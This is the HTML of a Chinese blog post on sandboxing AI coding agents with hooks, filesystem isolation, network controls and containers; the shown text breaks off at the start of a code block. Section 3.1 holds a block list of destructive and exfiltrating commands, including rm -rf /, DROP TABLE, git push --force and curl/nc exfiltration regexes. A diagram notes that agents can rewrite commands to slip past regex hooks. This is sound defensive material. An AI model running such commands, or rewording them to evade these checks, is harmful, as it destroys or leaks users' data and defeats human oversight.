@@ -1,0 +1,1339 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Harness Engineering 之二：给 Agent 搭一个安全沙箱 - 赛博闲谭-whitefirer</title><meta name="Description" content="Agent 沙箱不是二进制选择（有/没有），是四层递进防御：Hook 预检 → 文件系统隔离 → 网络熔断 → 进程监狱。每层拦不同类型的灾难，本文给每层一个可运行的配置。">
+
+<meta name="application-name" content="赛博闲谭-whitefirer">
+<meta name="apple-mobile-web-app-title" content="赛博闲谭-whitefirer"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+        <link rel="icon" type="image/png" href="/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" /><link rel="prev" href="https://whitefirer.org/posts/2026/07/19/dutch-pasture-ai-era/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://fastly.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><meta property="og:title" content="Harness Engineering 之二：给 Agent 搭一个安全沙箱 - 赛博闲谭-whitefirer" />
+<meta property="og:description" content="Agent 沙箱不是二进制选择（有/没有），是四层递进防御：Hook 预检 → 文件系统隔离 → 网络熔断 → 进程监狱。每层拦不同类型的灾难，本文给每层一个可运行的配置。" />
+<meta property="og:image" content="https://whitefirer.org/og-default.png" />
+<meta property="og:url" content="https://whitefirer.org/posts/2026/07/19/harness-engineering-sandbox/" />
+<meta property="og:type" content="article" />
+<meta property="og:site_name" content="赛博闲谭-whitefirer" /><meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Harness Engineering 之二：给 Agent 搭一个安全沙箱 - 赛博闲谭-whitefirer" />
+<meta name="twitter:description" content="Agent 沙箱不是二进制选择（有/没有），是四层递进防御：Hook 预检 → 文件系统隔离 → 网络熔断 → 进程监狱。每层拦不同类型的灾难，本文给每层一个可运行的配置。" />
+<meta name="twitter:image" content="https://whitefirer.org/og-default.png" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Harness Engineering 之二：给 Agent 搭一个安全沙箱",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/whitefirer.org\/posts\/2026\/07\/19\/harness-engineering-sandbox\/"
+        },"genre": "posts","keywords": "tech, ai, harness engineering, agent, sandbox, claude code, security","wordcount":  8984 ,
+        "url": "https:\/\/whitefirer.org\/posts\/2026\/07\/19\/harness-engineering-sandbox\/","datePublished": "2026-07-19T04:30:00+08:00","dateModified": "2026-07-23T19:35:57+08:00","license": "2022©️whitefirer","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whitefirer"
+            },"description": "Agent 沙箱不是二进制选择（有/没有），是四层递进防御：Hook 预检 → 文件系统隔离 → 网络熔断 → 进程监狱。每层拦不同类型的灾难，本文给每层一个可运行的配置。"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="赛博闲谭-whitefirer">赛博闲谭-whitefirer</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/series/ai-zatan/"> AI 杂谈 </a><div class="menu-item has-dropdown">
+                            <span class="dropdown-toggle">AI 编程 <i class="fas fa-chevron-down fa-fw"></i></span>
+                            <div class="dropdown-menu"><a class="dropdown-item" href="/series/claude-code-deep-dive/"> Claude Code </a><a class="dropdown-item" href="/series/harness-engineering/"> Harness Engineering </a></div>
+                        </div><a class="menu-item" href="/series/%e5%9f%ba%e7%a1%80%e6%9e%b6%e6%9e%84/"> 基础架构 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="https://github.com/whitefirer" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/index.xml" title="Rss"><i class='fa fa-rss fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="选择语言">
+                    <i class="fa fa-globe" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/posts/2026/07/19/harness-engineering-sandbox/" selected>简体中文</option></select>
+                </a></div>
+        </div>
+    </div>
+</header>
+<script>
+(function() {
+    document.querySelectorAll('.has-dropdown .dropdown-toggle').forEach(function(toggle) {
+        toggle.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            var parent = this.closest('.has-dropdown');
+            parent.classList.toggle('open');
+        });
+    });
+    document.addEventListener('click', function() {
+        document.querySelectorAll('.has-dropdown.open').forEach(function(d) {
+            d.classList.remove('open');
+        });
+    });
+})();
+</script><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="赛博闲谭-whitefirer">赛博闲谭-whitefirer</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/series/ai-zatan/" title="">AI 杂谈</a><div class="menu-item has-dropdown">
+                        <span class="dropdown-toggle">AI 编程 <i class="fas fa-chevron-down fa-fw"></i></span>
+                        <div class="dropdown-menu"><a class="dropdown-item" href="/series/claude-code-deep-dive/"> Claude Code </a><a class="dropdown-item" href="/series/harness-engineering/"> Harness Engineering </a></div>
+                    </div><a class="menu-item" href="/series/%e5%9f%ba%e7%a1%80%e6%9e%b6%e6%9e%84/" title="">基础架构</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="https://github.com/whitefirer" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/index.xml" title="Rss"><i class='fa fa-rss fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/posts/2026/07/19/harness-engineering-sandbox/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><div id="reading-progress"></div>
+    <article class="page single"><div style="display:flex;align-items:baseline;gap:0">
+        <h1 class="single-title animate__animated animate__flipInX" style="margin-bottom:0">Harness Engineering 之二：给 Agent 搭一个安全沙箱</h1></div><h2 class="single-subtitle">Prompt 是劝，沙箱是墙——Hook 拦截、文件系统隔离、网络熔断、进程监狱，四层递进防御从零搭起</h2><div class="post-series">
+                <a href="/series/harness-engineering/"><i class="fas fa-layer-group fa-fw" aria-hidden="true"></i>AI 编程·Harness Engineering</a>
+            </div><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://whitefirer.org" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whitefirer</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/tech/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-07-19">2026-07-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 8984 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 18 分钟&nbsp;<img src="https://hits.sh/whitefirer.org/posts/2026/07/19/harness-engineering-sandbox.svg" alt="" aria-hidden="true" loading="eager"
+     style="position:absolute;width:1px;height:1px;opacity:0;overflow:hidden;clip:rect(0 0 0 0);pointer-events:none"></div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-一个凌晨三点的电话">0. 一个凌晨三点的电话</a></li>
+    <li><a href="#1-威胁模型边界沿三个通道画">1. 威胁模型：边界沿三个通道画</a></li>
+    <li><a href="#2-不是二进制开关是四层递进防御">2. 不是二进制开关，是四层递进防御</a></li>
+    <li><a href="#3-第一层hook-预检命令级拦截">3. 第一层：Hook 预检——命令级拦截</a>
+      <ul>
+        <li><a href="#31-它拦什么">3.1 它拦什么</a></li>
+        <li><a href="#32-实现">3.2 实现</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-第二层文件系统隔离让-agent-只碰到该碰的文件">4. 第二层：文件系统隔离——让 Agent 只碰到该碰的文件</a>
+      <ul>
+        <li><a href="#41-核心思路">4.1 核心思路</a></li>
+        <li><a href="#42-方案-agit-worktree轻量">4.2 方案 A：Git Worktree（轻量）</a></li>
+        <li><a href="#43-方案-b只读挂载--overlayfs中级">4.3 方案 B：只读挂载 + OverlayFS（中级）</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-第三层网络熔断agent-发不出不该发的请求">5. 第三层：网络熔断——Agent 发不出不该发的请求</a>
+      <ul>
+        <li><a href="#51-攻击面">5.1 攻击面</a></li>
+        <li><a href="#52-方案socks5-代理--白名单">5.2 方案：SOCKS5 代理 + 白名单</a></li>
+        <li><a href="#53-更轻的方案hook-级网络检查">5.3 更轻的方案：Hook 级网络检查</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-第四层进程监狱dockervm-级隔离">6. 第四层：进程监狱——Docker/VM 级隔离</a>
+      <ul>
+        <li><a href="#61-最小化容器沙箱">6.1 最小化容器沙箱</a></li>
+        <li><a href="#62-seccomp-白名单">6.2 seccomp 白名单</a></li>
+        <li><a href="#63-冒烟测试验证沙箱真的在起作用">6.3 冒烟测试——验证沙箱真的在起作用</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-沙箱设计的四个原则">7. 沙箱设计的四个原则</a>
+      <ul>
+        <li><a href="#71-最小权限不是最小麻烦">7.1 最小权限，不是最小麻烦</a></li>
+        <li><a href="#72-默认拒绝白名单放行">7.2 默认拒绝，白名单放行</a></li>
+        <li><a href="#73-分层防御不依赖任何单层">7.3 分层防御，不依赖任何单层</a></li>
+        <li><a href="#74-可逆性判据不是危险程度判据">7.4 可逆性判据，不是危险程度判据</a></li>
+        <li><a href="#75-hook-级拦截-vs-容器级隔离怎么选">7.5 Hook 级拦截 vs 容器级隔离：怎么选</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-选型指南你的场景该上到第几层">8. 选型指南：你的场景该上到第几层</a></li>
+    <li><a href="#9-和系列其他组件的关系">9. 和系列其他组件的关系</a></li>
+    <li><a href="#10-结语">10. 结语</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p>Prompt 是劝，沙箱是墙。劝一个 Agent 别干坏事是没用的——它分不清哪些是数据、哪些是指令。你能做的只有一件事：把它关进一个干不了坏事的屋子里。</p>
+</blockquote>
+<hr>
+<h2 id="0-一个凌晨三点的电话">0. 一个凌晨三点的电话</h2>
+<p>上个月某天凌晨三点，我朋友打来电话。他的 Claude Code Agent 在修一个配置文件时，把 <code>rm -rf /home/user/project/data/*</code> 改成了 <code>rm -rf /home/user/project/data /*</code>——多了一个空格，<code>/*</code> 从&quot;data 下的所有文件&quot;变成了&quot;根目录下的所有文件&quot;。然后整个项目目录就没了。</p>
+<p>好在 repo 在 GitHub 上有推送，clone 回来就行——但 <code>.git</code> 也被删了，工作区里没 push 的改动全丢了。如果你问他&quot;Agent 为什么能执行这种命令&quot;，答案是：<strong>没有任何东西拦着它。</strong></p>
+<p>你给 Agent 一个 Bash 工具，它就什么都能干。<code>curl</code> 能把你的环境变量发到外部服务器。<code>git push --force</code> 能把远程仓库搞没。<code>pip install</code> 能装任何包。Agent 不会&quot;恶意&quot;做这些事——它只是不知道边界在哪。</p>
+<p><a href="/posts/2026/07/03/harness-engineering-intro/" rel="">上一篇</a>我画了 Harness 六组件全景图。这篇扎进第一个组件深处：<strong>工具系统的安全边界到底怎么画。</strong></p>
+<hr>
+<h2 id="1-威胁模型边界沿三个通道画">1. 威胁模型：边界沿三个通道画</h2>
+<p>谈沙箱之前先想清楚防什么。Agent 会惹的事，归到底只有三个通道：</p>
+<figure>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 680 240" width="100%" style="max-width:680px;display:block;margin:1.2em auto"><defs><filter id="sh"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-opacity="0.08"/></filter></defs><g filter="url(#sh)"><rect x="260" y="16" width="160" height="48" rx="8" fill="#6366f1"/><text x="340" y="46" text-anchor="middle" fill="#fff" font-size="15" font-weight="700" font-family="system-ui,sans-serif">Agent</text></g><line x1="300" y1="64" x2="140" y2="100" stroke="#d1d5db" stroke-width="1.5"/><line x1="340" y1="64" x2="340" y2="100" stroke="#d1d5db" stroke-width="1.5"/><line x1="380" y1="64" x2="540" y2="100" stroke="#d1d5db" stroke-width="1.5"/><g filter="url(#sh)"><rect x="50" y="100" width="180" height="110" rx="8" fill="#fff" stroke="#f59e0b" stroke-width="1.5"/><rect x="50" y="100" width="180" height="28" rx="8" fill="#f59e0b"/><rect x="50" y="120" width="180" height="8" fill="#f59e0b"/><text x="140" y="119" text-anchor="middle" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">读 · 保密性</text><text x="140" y="148" text-anchor="middle" fill="#374151" font-size="11" font-family="system-ui,sans-serif">读到了不该读的</text><text x="140" y="166" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">.env / ~/.ssh / 云凭证</text><text x="140" y="184" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">商业机密 / 用户数据</text></g><g filter="url(#sh)"><rect x="250" y="100" width="180" height="110" rx="8" fill="#fff" stroke="#ef4444" stroke-width="1.5"/><rect x="250" y="100" width="180" height="28" rx="8" fill="#ef4444"/><rect x="250" y="120" width="180" height="8" fill="#ef4444"/><text x="340" y="119" text-anchor="middle" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">写 · 完整性</text><text x="340" y="148" text-anchor="middle" fill="#374151" font-size="11" font-family="system-ui,sans-serif">写了不该写的</text><text x="340" y="166" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">rm -rf / 改 CI 配置</text><text x="340" y="184" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">改 hooks / 给自己提权</text></g><g filter="url(#sh)"><rect x="450" y="100" width="180" height="110" rx="8" fill="#fff" stroke="#10b981" stroke-width="1.5"/><rect x="450" y="100" width="180" height="28" rx="8" fill="#10b981"/><rect x="450" y="120" width="180" height="8" fill="#10b981"/><text x="540" y="119" text-anchor="middle" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">连 · 渗出</text><text x="540" y="148" text-anchor="middle" fill="#374151" font-size="11" font-family="system-ui,sans-serif">连了不该连的</text><text x="540" y="166" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">curl 把数据传出去</text><text x="540" y="184" text-anchor="middle" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">DNS 隧道 / 恶意下载</text></g></svg>
+<figcaption class="image-caption">图 1：Agent 的威胁模型——读、写、连三个通道</figcaption>
+</figure>
+<ul>
+<li><strong>文件系统隔离</strong>管&quot;读&quot;和&quot;写&quot;——Agent 能碰哪些文件；</li>
+<li><strong>网络隔离</strong>管&quot;连&quot;——Agent 能跟哪些地址说话；</li>
+<li><strong>权限模型</strong>管每个动作的&quot;要不要问&quot;——哪些放行、哪些拦截、哪些人审。</li>
+</ul>
+<p>这三个通道不是平行的——读是写的前置，连是写的放大器。读到 <code>.env</code> 不可怕，读到之后能 <code>curl</code> 出去才可怕。防御也不是三个独立的墙，是<strong>四层递进叠加</strong>。每一层拦不同类型的灾难，配不同的粒度：</p>
+<hr>
+<h2 id="2-不是二进制开关是四层递进防御">2. 不是二进制开关，是四层递进防御</h2>
+<p>说到&quot;沙箱&quot;，很多人第一反应是 Docker——要么在容器里跑，要么不在。但 Agent 的安全问题不是二进制的。</p>
+<p>举个例子：Agent 要改一个文件。如果把它关在 Docker 里，它只能改容器内的文件——安全了，但它也改不到你本地的项目。它就没有用了。</p>
+<p>所以真正的沙箱不是一道墙，是<strong>四层递进防御</strong>。每一层拦不同类型的灾难，配不同的粒度：</p>
+<figure>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 420" width="100%" style="max-width:720px;display:block;margin:1.2em auto"><defs><linearGradient id="l1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#ef4444"/><stop offset="100%" stop-color="#f87171"/></linearGradient><linearGradient id="l2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#f59e0b"/><stop offset="100%" stop-color="#fbbf24"/></linearGradient><linearGradient id="l3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#6366f1"/><stop offset="100%" stop-color="#818cf8"/></linearGradient><linearGradient id="l4" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#10b981"/><stop offset="100%" stop-color="#34d399"/></linearGradient><filter id="sh"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-opacity="0.06"/></filter></defs><!-- Agent at top --><rect x="260" y="10" width="200" height="36" rx="18" fill="#1f2937"/><text x="360" y="33" text-anchor="middle" fill="#fff" font-size="13" font-weight="700" font-family="system-ui,sans-serif">Agent 工具调用</text><!-- Arrow --><line x1="360" y1="46" x2="360" y2="64" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,63 360,67 364,63" fill="#9ca3af"/><!-- Layer 1 --><g filter="url(#sh)"><rect x="30" y="70" width="660" height="70" rx="8" fill="#fff" stroke="#ef4444" stroke-width="1.5"/><rect x="30" y="70" width="660" height="28" rx="8" fill="url(#l1)"/><rect x="30" y="90" width="660" height="8" fill="url(#l1)"/><text x="46" y="89" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第一层：Hook 预检 — 命令级拦截</text><text x="46" y="116" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">在命令执行之前检查。拦危险模式：rm -rf /、DROP TABLE、curl 敏感数据外传、git push --force。</text><text x="46" y="132" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~1ms | 粒度：单条命令 | 绕过难度：低（Agent 可以改写命令绕过正则）</text></g><!-- Arrow --><line x1="360" y1="140" x2="360" y2="158" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,157 360,161 364,157" fill="#9ca3af"/><!-- Layer 2 --><g filter="url(#sh)"><rect x="30" y="162" width="660" height="70" rx="8" fill="#fff" stroke="#f59e0b" stroke-width="1.5"/><rect x="30" y="162" width="660" height="28" rx="8" fill="url(#l2)"/><rect x="30" y="182" width="660" height="8" fill="url(#l2)"/><text x="46" y="181" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第二层：文件系统隔离 — 路径级拦截</text><text x="46" y="208" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">限制 Agent 能读写的目录。Worktree、只读挂载、敏感文件黑名单（.env、secrets.yaml、~/.ssh）。</text><text x="46" y="224" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~10ms（worktree 创建时 ~300ms）| 粒度：目录/文件 | 绕过难度：中</text></g><!-- Arrow --><line x1="360" y1="232" x2="360" y2="250" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,249 360,253 364,249" fill="#9ca3af"/><!-- Layer 3 --><g filter="url(#sh)"><rect x="30" y="254" width="660" height="70" rx="8" fill="#fff" stroke="#6366f1" stroke-width="1.5"/><rect x="30" y="254" width="660" height="28" rx="8" fill="url(#l3)"/><rect x="30" y="274" width="660" height="8" fill="url(#l3)"/><text x="46" y="273" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第三层：网络熔断 — 连接级拦截</text><text x="46" y="300" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">白名单/黑名单域名、内网 IP 拦截、速率限制。防数据外泄和 SSRF。</text><text x="46" y="316" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：~5ms | 粒度：域名/IP/端口 | 绕过难度：中高（需要了解网络拓扑）</text></g><!-- Arrow --><line x1="360" y1="324" x2="360" y2="342" stroke="#9ca3af" stroke-width="1.5"/><polygon points="356,341 360,345 364,341" fill="#9ca3af"/><!-- Layer 4 --><g filter="url(#sh)"><rect x="30" y="346" width="660" height="70" rx="8" fill="#fff" stroke="#10b981" stroke-width="1.5"/><rect x="30" y="346" width="660" height="28" rx="8" fill="url(#l4)"/><rect x="30" y="366" width="660" height="8" fill="url(#l4)"/><text x="46" y="365" fill="#fff" font-size="12" font-weight="700" font-family="system-ui,sans-serif">第四层：进程监狱 — 环境级隔离</text><text x="46" y="392" fill="#374151" font-size="10.5" font-family="system-ui,sans-serif">Docker/VM 级隔离、资源限制（CPU/内存/磁盘）、系统调用过滤（seccomp）。Agent 做的事全在狱里。</text><text x="46" y="408" fill="#6b7280" font-size="10" font-family="system-ui,sans-serif">开销：1-5s（容器启动）| 粒度：整个运行环境 | 绕过难度：高（需要内核漏洞）</text></g></svg>
+<figcaption class="image-caption">图 2：Agent 沙箱四层递进防御模型。每层不是替代关系，是叠加关系。</figcaption>
+</figure>
+<p>关键洞察：<strong>这四层不是四选一，是叠着用。</strong> 每加一层，Agent 能造的灾难就少一批，同时 Agent 的能力也受限一批。沙箱设计的核心问题是&quot;你愿意用多少能力换多少安全&quot;——而不是&quot;怎么做到绝对安全&quot;。</p>
+<p>下面一层一层拆开，每层给一个可运行的配置。</p>
+<hr>
+<h2 id="3-第一层hook-预检命令级拦截">3. 第一层：Hook 预检——命令级拦截</h2>
+<p>这是最轻的一层。在命令发给 shell 之前，用正则/规则引擎检查它是否危险。拦住了就不执行，没拦住就放行。</p>
+<h3 id="31-它拦什么">3.1 它拦什么</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>危险模式</th>
+<th>为什么危险</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>破坏性删除</td>
+<td><code>rm -rf /</code>、<code>rm -rf ~</code>、<code>rm -rf ./*</code></td>
+<td>递归删根目录或家目录</td>
+</tr>
+<tr>
+<td>数据库灾难</td>
+<td><code>DROP TABLE</code>、<code>DROP DATABASE</code>、<code>TRUNCATE</code></td>
+<td>不可逆数据清除</td>
+</tr>
+<tr>
+<td>强制推送</td>
+<td><code>git push --force</code>、<code>git push -f</code></td>
+<td>覆盖远程历史</td>
+</tr>
+<tr>
+<td>敏感文件操作</td>
+<td><code>chmod 777</code>、<code>&gt; /etc/passwd</code></td>
+<td>权限泄露或系统破坏</td>
+</tr>
+<tr>
+<td>数据外传</td>
+<td><code>curl.*\.env</code>、<code>nc.*192\.168</code></td>
+<td>把敏感数据发出去</td>
+</tr>
+<tr>
+<td>权限变更</td>
+<td><code>sudo</code>、<code>su -</code></td>
+<td>提权操作</td>
+</tr>
+</tbody>
+</table>
+<p>注意：不是所有 <code>rm</code> 都危险。<code>rm -rf ./node_modules</code> 没问题，<code>rm -rf /</code> 有问题。规则要区分<strong>合法操作</strong>和<strong>同等命令的灾难版本</strong>。</p>
+<h3 id="32-实现">3.2 实现</h3>
+<p>Claude Code 的 <code>PreToolUse</code> Hook 在这一层。下面是一个可用的配置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="c1">// .claude/settings.json — PreToolUse Hook 拦截危险命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hooks&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;PreToolUse&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;matcher&#34;</span><span class="p">:</span> <span class="s2">&#34;Bash&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;hooks&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;command&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;command&#34;</span><span class="p">:</span> <span class="s2">&#34;python3 .claude/hooks/danger-guard.py&#34;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
